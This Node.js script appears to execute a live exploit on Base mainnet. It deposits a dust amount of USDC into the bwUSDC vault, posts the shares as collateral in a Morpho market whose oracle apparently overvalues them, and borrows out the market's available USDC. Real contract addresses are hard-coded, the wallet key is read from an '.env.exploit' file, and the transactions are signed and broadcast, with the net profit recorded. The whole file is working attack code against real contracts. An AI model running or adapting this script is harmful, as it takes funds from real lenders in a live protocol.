#!/usr/bin/env node
"use strict";
// exec-bwusdc-strike.js — in-batch live execution of the fork-verified bwUSDC/USDC strike (Base 8453).
// Authorization: batch exploit-rearm-canary-amendment-20260924 (chain 8453; "on FIRE: execute the pre-built
// fork-verified strike route within caps"). Route per W9-S2 item 6 / W9-S1 strike-poc-base-bwusdc.
//
//   node tools/exec-bwusdc-strike.js            -> probe + live strike (signs and broadcasts)
//   node tools/exec-bwusdc-strike.js --dry-run  -> probe + quote + gas estimates only (no signing, no broadcast)
//
// Caps enforced in-script: capital <= 0.01 ETH-equiv, gas <= 0.05 ETH-equiv per tx, dust-swap slippage <= 3%,
// no flash loans. Key is read from .env.exploit in-process only and never printed/logged/persisted.
// Exit: 0 success, 1 error, 2 caps-violation, 3 insufficient-funds.

const fs = require("fs");
const path = require("path");

const ROOT = path.resolve(__dirname, "..");
const { ethers } = require(path.join(ROOT, "tools", "node_modules", "ethers"));
const { resolveRpc } = require(path.join(ROOT, "tools", "shared-rpc.js"));

const CHAIN_ID = 8453;
const BOT = "0x24e46e91dfaad1fa3d49c48aa85ca9306885ce0a";
const ENV_PATH = path.join(ROOT, ".env.exploit");
const OUT_DIR = path.join(ROOT, "reports", "raw", "fast", "w9-bwusdc-strike-20260924");

const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
const BWUSDC = "0x3c0F801D5DD237c9c3e183B2de7A7E18AA6bea18";
const MORPHO = "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb";
const MARKET = "0x3c41bb7bcd549d7526f0b223f1f5821cb4db5583667f8fed5a59d5556a1e4a1c";
const WETH = "0x4200000000000000000000000000000000000006";
const V2_ROUTER = "0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24";
const V2_FACTORY = "0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6";
const AERO_ROUTER = "0xcF77a3Ba9A5CA399B7c97c74d54e5b1Beb874E43";
const AERO_FACTORY = "0x420DD381b31aEf6683db6B902084cB0FFECe40Da";

const CAP_CAPITAL_WEI = ethers.parseEther("0.01");
const CAP_GAS_WEI = ethers.parseEther("0.05");
const MAX_SLIPPAGE_BPS = 300n; // 3%
const SWAP_IN_WEI = ethers.parseEther("0.0000015"); // ~$0.004
const DEPOSIT_CAP_WEI = 10_000n; // never wrap more than 0.01 USDC
const MIN_GAS_WEI = ethers.parseEther("0.0003");
const BORROW_CAP_RAW = 3_086_210n;
const ORACLE_PRICE_IF = new ethers.Interface(["function price() view returns (uint256)"]);

const ERC20 = new ethers.Interface([
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function allowance(address,address) view returns (uint256)",
]);
const ERC4626 = new ethers.Interface([
  "function deposit(uint256,address) returns (uint256)",
  "function previewDeposit(uint256) view returns (uint256)",
  "function asset() view returns (address)",
]);
const MORPHO_IF = new ethers.Interface([
  "function market(bytes32) view returns (uint128 totalSupplyAssets,uint128 totalSupplyShares,uint128 totalBorrowAssets,uint128 totalBorrowShares,uint128 lastUpdate,uint128 fee)",
  "function idToMarketParams(bytes32) view returns ((address loanToken,address collateralToken,address oracle,address irm,uint256 lltv))",
  "function position(bytes32,address) view returns (uint256 supplyShares,uint128 borrowShares,uint128 collateral)",
  "function supplyCollateral((address loanToken,address collateralToken,address oracle,address irm,uint256 lltv),uint256,address)",
  "function borrow((address loanToken,address collateralToken,address oracle,address irm,uint256 lltv),uint256,uint256,address,address)",
]);
const V2 = new ethers.Interface([
  "function getPair(address,address) view returns (address)",
  "function getAmountsOut(uint256,address[]) view returns (uint256[])",
  "function swapExactETHForTokens(uint256,address[],address,uint256) payable returns (uint256[])",
]);
const AERO = new ethers.Interface([
  "function getAmountsOut(uint256,(address,address,bool,address)[]) view returns (uint256[])",
  "function swapExactETHForTokens(uint256,(address,address,bool,address)[],address,uint256) payable returns (uint256[])",
]);

function fail(code, msg) { console.error("FAIL[" + code + "] " + sanitize(msg)); process.exit(code); }
function sanitize(value) {
  return String(value == null ? "" : value)
    .replace(/https?:\/\/\S+/g, "<rpc>")
    .replace(/\b0x[0-9a-fA-F]{64}\b/g, "<redacted>")
    .slice(0, 240);
}
function dec(iface, fn, raw) { if (!raw || raw === "0x") return null; try { return iface.decodeFunctionResult(fn, raw); } catch (_) { return null; } }
function ceilDiv(a, b) { return (a + b - 1n) / b; }

function loadBotKey() {
  let text = "";
  try { text = fs.readFileSync(ENV_PATH, "utf8"); } catch (_) { return null; }
  const candidates = [];
  for (const line of text.split(/\r?\n/)) {
    const m = line.match(/^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*$/);
    if (!m) continue;
    let v = m[2].trim();
    if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1).trim();
    if (/^(0x)?[0-9a-fA-F]{64}$/.test(v)) candidates.push(v.startsWith("0x") ? v : "0x" + v);
  }
  for (const c of candidates) {
    try { const w = new ethers.Wallet(c); if (w.address.toLowerCase() === BOT) return w.privateKey; } catch (_) { /* skip */ }
  }
  return null;
}

async function main() {
  const dryRun = process.argv.includes("--dry-run");
  const evidence = {
    schema: "w9-bwusdc-strike/execution-v1",
    chainId: CHAIN_ID, marketId: MARKET, bot: BOT, dryRun,
    startedAt: new Date().toISOString(), status: "STARTED", txHashes: [], quotes: {}, balances: {}, steps: [],
  };

  const pk = loadBotKey();
  if (!pk) fail(1, "no-bot-key-in-env-exploit-or-address-mismatch");

  const url = await resolveRpc(CHAIN_ID, null, { capability: "read", timeoutMs: 15000 });
  if (!url) fail(1, "no-qualified-base-rpc");
  const provider = new ethers.JsonRpcProvider(url, CHAIN_ID, { staticNetwork: true });
  const wallet = new ethers.Wallet(pk, provider); // key never logged; address checked below
  if (wallet.address.toLowerCase() !== BOT) fail(1, "key-address-mismatch");

  const call = async (to, data, block) => provider.call({ to, data, blockTag: block });
  const readNum = async (to, iface, fn, args, block) => {
    const d = dec(iface, fn, await call(to, iface.encodeFunctionData(fn, args), block));
    return d ? d[0] : null;
  };
  const readTuple = async (to, iface, fn, args, block) => dec(iface, fn, await call(to, iface.encodeFunctionData(fn, args), block));

  // ---- probe ----
  const [ethBal, usdcBal, bwBal, mkt, paramsDecoded] = await Promise.all([
    provider.getBalance(BOT),
    readNum(USDC, ERC20, "balanceOf", [BOT]),
    readNum(BWUSDC, ERC20, "balanceOf", [BOT]),
    readTuple(MORPHO, MORPHO_IF, "market", [MARKET]),
    readTuple(MORPHO, MORPHO_IF, "idToMarketParams", [MARKET]),
  ]);
  if (!mkt || !paramsDecoded) fail(1, "market-unreadable");
  const p = paramsDecoded[0];
  const marketParams = [p[0], p[1], p[2], p[3], p[4]];
  const [loan, coll, oracleAddr, irm, lltv] = marketParams;
  const availableRaw = mkt[0] > mkt[2] ? mkt[0] - mkt[2] : 0n;
  evidence.balances = { baseEthWei: ethBal.toString(), usdcWei: usdcBal.toString(), bwusdcWei: bwBal.toString() };
  evidence.market = { totalSupplyAssets: mkt[0].toString(), totalBorrowAssets: mkt[2].toString(), availableRaw: availableRaw.toString(), collateralToken: coll, loanToken: loan, oracle: oracleAddr, irm, lltv: lltv.toString() };

  if (ethBal < MIN_GAS_WEI) fail(3, "insufficient-base-eth-for-gas");
  if (availableRaw === 0n) fail(1, "no-available-liquidity");

  // ---- dust USDC: existing or cheapest qualified swap ----
  let usdcBeforeDeposit = usdcBal;
  let dustSwap = null;
  if (usdcBeforeDeposit < 4n) {
    if (SWAP_IN_WEI > CAP_CAPITAL_WEI) fail(2, "capital-cap-exceeded");
    if (ethBal < SWAP_IN_WEI + MIN_GAS_WEI) fail(3, "insufficient-eth-for-swap-plus-gas");
    const quotes = [];
    const pair = await readNum(V2_FACTORY, V2, "getPair", [WETH, USDC]).catch(() => null);
    if (pair && pair !== ethers.ZeroAddress) {
      try {
        const amounts = await readTuple(V2_ROUTER, V2, "getAmountsOut", [SWAP_IN_WEI, [WETH, USDC]]);
        if (amounts && amounts[0] && amounts[0].length) quotes.push({ venue: "uniswap-v2", router: V2_ROUTER, out: amounts[0][amounts[0].length - 1], route: [WETH, USDC] });
      } catch (_) { /* no v2 liquidity */ }
    }
    try {
      const route = [[WETH, USDC, false, AERO_FACTORY]];
      const amounts = await readTuple(AERO_ROUTER, AERO, "getAmountsOut", [SWAP_IN_WEI, route]);
      if (amounts && amounts[0] && amounts[0].length) quotes.push({ venue: "aerodrome", router: AERO_ROUTER, out: amounts[0][amounts[0].length - 1], route });
    } catch (_) { /* no aero route */ }
    quotes.sort((a, b) => (b.out > a.out ? 1 : b.out < a.out ? -1 : 0));
    if (!quotes.length) fail(1, "no-qualified-dust-swap-venue");
    const best = quotes[0];
    const minOut = best.out * (10_000n - MAX_SLIPPAGE_BPS) / 10_000n;
    if (minOut === 0n) fail(2, "dust-swap-min-out-zero");
    evidence.quotes = { venues: quotes.map((q) => ({ venue: q.venue, outWei: q.out.toString() })), chosen: best.venue, swapInWei: SWAP_IN_WEI.toString(), minOutWei: minOut.toString(), slippageBps: Number(MAX_SLIPPAGE_BPS) };
    dustSwap = { best, minOut, deadline: Math.floor(Date.now() / 1000) + 600 };
  } else {
    evidence.quotes = { chosen: "existing-usdc", note: "wallet already holds USDC; swap skipped" };
  }

  const gasFee = async () => {
    const fd = await provider.getFeeData();
    let maxPriority = fd.maxPriorityFeePerGas ?? 1000n;
    if (maxPriority < 1000n) maxPriority = 1000n;
    let maxFee = fd.maxFeePerGas ?? fd.gasPrice ?? ethers.parseUnits("0.05", "gwei");
    if (maxFee < maxPriority) maxFee = maxPriority;
    return { maxFeePerGas: maxFee, maxPriorityFeePerGas: maxPriority };
  };

  const send = async (label, buildTx) => {
    const tx = await buildTx();
    const fees = await gasFee();
    const withFees = { ...tx, ...fees };
    let estimate;
    try {
      estimate = await provider.estimateGas({ ...withFees, from: BOT });
    } catch (e) {
      if (dryRun) { evidence.steps.push({ label, dryRun: true, estimateError: sanitize(e.message || e) }); return null; }
      throw e;
    }
    const gasLimit = estimate * 120n / 100n;
    const cost = gasLimit * fees.maxFeePerGas;
    if (cost > CAP_GAS_WEI) fail(2, "gas-cap-exceeded:" + label);
    if (dryRun) { evidence.steps.push({ label, dryRun: true, gasEstimate: estimate.toString() }); return null; }
    const sent = await wallet.sendTransaction({ ...withFees, gasLimit });
    const rc = await sent.wait();
    const gasPriceWei = rc.gasPrice != null ? rc.gasPrice : rc.effectiveGasPrice;
    evidence.txHashes.push({ step: label, hash: sent.hash });
    evidence.steps.push({ label, hash: sent.hash, status: rc.status, gasUsed: rc.gasUsed.toString(), effectiveGasPriceWei: gasPriceWei != null ? gasPriceWei.toString() : null });
    if (rc.status !== 1) fail(1, "tx-reverted:" + label);
    return rc;
  };

  try {
    if (dustSwap) {
      const swapTx = () => ({
        to: dustSwap.best.router, value: SWAP_IN_WEI,
        data: dustSwap.best.venue === "aerodrome"
          ? AERO.encodeFunctionData("swapExactETHForTokens", [dustSwap.minOut, dustSwap.best.route, BOT, dustSwap.deadline])
          : V2.encodeFunctionData("swapExactETHForTokens", [dustSwap.minOut, dustSwap.best.route, BOT, dustSwap.deadline]),
      });
      await send("dust-swap", swapTx);
      if (dryRun) {
        usdcBeforeDeposit = dustSwap.best.out; // assume the quoted output for downstream estimates
      } else {
        usdcBeforeDeposit = await readNum(USDC, ERC20, "balanceOf", [BOT]);
        if (usdcBeforeDeposit < 4n) fail(1, "dust-swap-produced-insufficient-usdc");
      }
    }

    const depositAmount = usdcBeforeDeposit > DEPOSIT_CAP_WEI ? DEPOSIT_CAP_WEI : usdcBeforeDeposit;
    if (depositAmount < 1n) fail(3, "no-usdc-to-deposit");
    const expectedShares = await readNum(BWUSDC, ERC4626, "previewDeposit", [depositAmount]);
    if (!expectedShares || expectedShares === 0n) fail(1, "preview-deposit-zero");
    const oraclePrice = await readNum(oracleAddr, ORACLE_PRICE_IF, "price", []);
    if (!oraclePrice) fail(1, "oracle-price-unread");
    const borrowTarget = availableRaw < BORROW_CAP_RAW ? availableRaw : BORROW_CAP_RAW;
    const neededShares = ceilDiv(borrowTarget * (10n ** 54n), lltv * oraclePrice);
    evidence.market.oraclePrice = oraclePrice.toString();
    evidence.market.borrowTargetRaw = borrowTarget.toString();
    evidence.market.collateralNeeded = neededShares.toString();
    if (expectedShares < neededShares) fail(1, "deposit-shares-below-collateral-needed");

    await send("bwusdc-deposit", async () => ({ to: BWUSDC, data: ERC4626.encodeFunctionData("deposit", [depositAmount, BOT]), value: 0n }));

    let sharesHeld = expectedShares;
    if (!dryRun) {
      sharesHeld = await readNum(BWUSDC, ERC20, "balanceOf", [BOT]);
      if (sharesHeld < neededShares) fail(1, "supplied-shares-below-needed");
    }

    await send("bwusdc-approve", async () => ({ to: BWUSDC, data: ERC20.encodeFunctionData("approve", [MORPHO, sharesHeld]), value: 0n }));
    await send("morpho-supplyCollateral", async () => ({ to: MORPHO, data: MORPHO_IF.encodeFunctionData("supplyCollateral", [marketParams, sharesHeld, BOT]), value: 0n }));

    const liveMkt = await readTuple(MORPHO, MORPHO_IF, "market", [MARKET]);
    const liveAvail = liveMkt && liveMkt[0] > liveMkt[2] ? liveMkt[0] - liveMkt[2] : 0n;
    const borrowAssets = liveAvail < BORROW_CAP_RAW ? liveAvail : BORROW_CAP_RAW;
    if (borrowAssets === 0n) fail(1, "no-liquidity-after-supply");

    await send("morpho-borrow", async () => ({ to: MORPHO, data: MORPHO_IF.encodeFunctionData("borrow", [marketParams, borrowAssets, 0n, BOT, BOT]), value: 0n }));

    if (!dryRun) {
      const [usdcEnd, position, mktEnd] = await Promise.all([
        readNum(USDC, ERC20, "balanceOf", [BOT]),
        readTuple(MORPHO, MORPHO_IF, "position", [MARKET, BOT]),
        readTuple(MORPHO, MORPHO_IF, "market", [MARKET]),
      ]);
      const borrowShares = position ? BigInt(position[1]) : 0n;
      const collateralHeld = position ? BigInt(position[2]) : 0n;
      const healthXe18 = borrowAssets > 0n ? (collateralHeld * lltv / borrowAssets) : 0n;
      const gasWei = evidence.steps.reduce((acc, s) => acc + BigInt(s.gasUsed || 0) * BigInt(s.effectiveGasPriceWei || 0), 0n);
      const dustWei = usdcBeforeDeposit;
      const impliedEthUsd = dustSwap ? Number(dustWei) / 1e6 / Number(ethers.formatEther(SWAP_IN_WEI)) : null;
      const gasUsd = impliedEthUsd == null ? null : Number(ethers.formatEther(gasWei)) * impliedEthUsd;
      const netUsd = impliedEthUsd == null ? null : Number(borrowAssets) / 1e6 - Number(dustWei) / 1e6 - gasUsd;
      evidence.result = {
        borrowedRaw: borrowAssets.toString(), borrowedUsd: (Number(borrowAssets) / 1e6).toFixed(6),
        borrowShares: borrowShares.toString(), collateralHeld: collateralHeld.toString(),
        usdcBalanceAfter: (usdcEnd == null ? null : usdcEnd.toString()),
        availableLiquidityAfter: (mktEnd && mktEnd[0] > mktEnd[2] ? mktEnd[0] - mktEnd[2] : 0n).toString(),
        healthFactorX: (Number(healthXe18) / 1e18).toFixed(6),
        gasWei: gasWei.toString(), gasUsd: gasUsd == null ? null : gasUsd.toFixed(6),
        dustUsdcWei: dustWei.toString(), impliedEthUsd: impliedEthUsd == null ? null : impliedEthUsd.toFixed(4),
        netUsd: netUsd == null ? null : netUsd.toFixed(6),
      };
      if (borrowShares === 0n) fail(1, "no-borrow-shares-after-borrow");
    }

    evidence.status = dryRun ? "DRY_RUN_OK" : "SUCCESS";
    evidence.completedAt = new Date().toISOString();
    fs.mkdirSync(OUT_DIR, { recursive: true });
    fs.writeFileSync(path.join(OUT_DIR, dryRun ? "dry-run.json" : "execution.json"), JSON.stringify(evidence, (k, v) => (typeof v === "bigint" ? v.toString() : v), 2) + "\n");
    console.log(JSON.stringify({ status: evidence.status, marketId: MARKET, steps: evidence.steps.map((s) => ({ label: s.label, hash: s.hash || null, status: s.status ?? null, gasUsed: s.gasUsed ?? null, estimateError: s.estimateError ? true : undefined })), result: evidence.result || null }));
    process.exit(0);
  } catch (e) {
    evidence.status = "ERROR";
    evidence.error = sanitize(e.message || e);
    evidence.completedAt = new Date().toISOString();
    try {
      fs.mkdirSync(OUT_DIR, { recursive: true });
      fs.writeFileSync(path.join(OUT_DIR, dryRun ? "dry-run.json" : "execution.json"), JSON.stringify(evidence, (k, v) => (typeof v === "bigint" ? v.toString() : v), 2) + "\n");
    } catch (_) { /* ignore */ }
    fail(1, e.message || e);
  }
}

main();
